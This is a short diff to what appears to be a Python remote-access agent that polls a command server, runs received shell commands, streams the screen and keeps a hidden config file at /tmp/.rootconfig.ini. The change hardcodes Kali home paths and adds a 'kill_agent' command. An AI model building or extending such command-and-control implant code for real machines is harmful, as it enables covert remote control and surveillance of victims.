@@ -29,11 +29,11 @@ screenshare_thread = None
 current_stop_event = None
 
 # Track the current working directory (starting with the root or default directory)
-current_directory = os.path.expanduser("~")
+current_directory = "/home/kali"#os.path.expanduser("~")
 SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
-CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
+CONFIG_FILE_WINDOWS = "/home/kali" #os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
 
 # Function to get the username using `whoami` (works on both Windows and Linux)
 def get_username():
@@ -872,7 +872,8 @@ while True:
                     print("Invalid FPS value in command")
             elif command == "stop_screenshare":
                 stop_screenshare()
-
+            elif command == "kill_agent":
+                break
 
             else:
                 result = {"command":command, "result": execute_command(command), "client_id":client_id}
